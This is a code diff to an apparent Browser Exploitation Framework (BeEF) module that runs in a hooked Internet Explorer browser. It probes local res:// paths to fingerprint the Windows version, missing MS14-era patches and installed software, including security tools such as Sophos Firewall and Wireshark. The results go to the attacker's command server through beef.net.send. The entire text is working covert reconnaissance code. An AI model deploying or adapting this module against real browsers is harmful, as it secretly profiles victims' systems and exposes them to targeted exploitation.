@@ -8,6 +8,7 @@ beef.execute(function() {
 
 	var os_version = new Array;
         var installed_patches = new Array;
+	var installed_software = new Array;
 	var dom = document.createElement('b');
 
 	Array.prototype.unique = function() {
@@ -20,8 +21,10 @@ beef.execute(function() {
 	parse_os_details = function() {
 		if (!os_version.length) os_version[0] = "unknown"
                 if (!installed_patches.length) installed_patches[0] = "unknown"
+		if (!installed_software.length) installed_software[0] = "unknown"
                 beef.net.send("<%= @command_url %>", <%= @command_id %>, "windows_nt_version="+os_version.unique());
 		beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_patches=" +installed_patches.unique());
+		beef.net.send("<%= @command_url %>", <%= @command_id %>, "installed_software="+installed_software.unique());
 		document.body.removeChild(dom);
 	};
 
@@ -29,7 +32,7 @@ beef.execute(function() {
 	var fingerprints = new Array(
 		new Array("5.1+","res://IpsmSnap.dll/wlcm.bmp"),
 		new Array("5.1+","res://wmploc.dll/257/album_0.png"),
-		new Array("5.1-6.0","res://wmploc.dll/23/images\amg-logo.gif"),
+		new Array("5.1-6.0","res://wmploc.dll/23/images\\amg-logo.gif"),
 		new Array("5.1-6.1","res://wmploc.dll/wmcomlogo.jpg"),
 		new Array("6.0+","res://wdc.dll/error.gif")
 	);
@@ -43,7 +46,7 @@ beef.execute(function() {
 		dom.appendChild(img);
 	}
 
-	// Enumerate patches
+	// Enumerate patches (Win XP)
 	var path = "res://C:\\WINDOWS\\$NtUninstall";
 	var patches = new Array(
 		new Array("KB2964358", "mshtml.dll/2/2030"), //MS14-021
@@ -70,12 +73,47 @@ beef.execute(function() {
                 var img    = new Image;
                 img.name   = patches[i][0];
                 img.src    = path+patches[i][0]+"$\\"+patches[i][1];
-                img.onload = function() { installed_patches.push(this.name); dom.removeChild(this); }
+		img.onload = function() { installed_patches.push(this.name); dom.removeChild(this); }
 		img.onerror= function() { dom.removeChild(this); }
                 dom.appendChild(img);
         }
 
-	setTimeout('parse_os_details();', 3000);
+	// Enumerate software
+	var software = new Array(
+		new Array("Foxit Reader", "Foxit Software\\Foxit Reader\\Foxit Reader.exe/2/257"),
+		new Array("Internet Explorer", "Internet Explorer\\iedvtool.dll/2/4000"),
+		new Array("Outlook Express", "Outlook Express\\msoeres.dll/2/1"),
+		new Array("Immunity Debugger", "Immunity Inc\\Immunity Debugger\\ImmunityDebugger.exe/2/GOTO"),
+		new Array("Java JRE 1.7", "Java\\jre7\\bin\\awt.dll/2/CHECK_BITMAP"),
+		//new Array("Microsoft Silverlight v5.1.30514.0", "Microsoft Silverlight\\5.1.30514.0\\npctrl.dll/2/102"),
+		new Array("VMware Tools", "VMware\\VMware Tools\\TPVCGatewaydeu.dll/2/30994"),
+		new Array("Notepad++", "Notepad++\\uninstall.exe/2/110"),
+		new Array("OpenVPN", "OpenVPN\\Uninstall.exe/2/110"),
+		new Array("Sophos Client Firewall", "Sophos\\Sophos Client Firewall\\logo_rc.dll/2/114"),
+		new Array("VLC", "VideoLAN\\VLC\\npvlc.dll/2/3"),
+		new Array("Windows DVD Maker", "DVD Maker\\DVDMaker.exe/2/438"),
+		new Array("Windows Journal", "Windows Journal\\Journal.exe/2/112"),
+		new Array("Windows Mail", "Windows Mail\\msoeres.dll/2/1"),
+		new Array("Windows Movie Maker", "Movie Maker\\wmm2res.dll/2/201"),
+		new Array("Windows NetMeeting", "NetMeeting\\nmchat.dll/2/207"),
+		new Array("Windows Photo Viewer", "Windows Photo Viewer\\PhotoViewer.dll/2/#51209"),
+		new Array("Wireshark", "Wireshark\\uninstall.exe/2/110")
+		//new Array("ZeroMQ v4.0.4", "ZeroMQ 4.0.4\\Uninstall.exe/2/110")
+	);
+
+	var program_dirs = new Array("C:\\Program Files\\", "C:\\Program Files (x86)\\")
+	for (dir=0;dir<program_dirs.length; dir++) {
+          for (var i=0; i<software.length; i++) {
+                var img    = new Image;
+                img.name   = software[i][0];
+                img.src    = "res://"+program_dirs[dir]+software[i][1];
+                img.onload = function() { installed_software.push(this.name); dom.removeChild(this); }
+                img.onerror= function() { dom.removeChild(this); }
+                dom.appendChild(img);
+          }
+	}
+
+	setTimeout('parse_os_details();', 5000);
 
 });
 
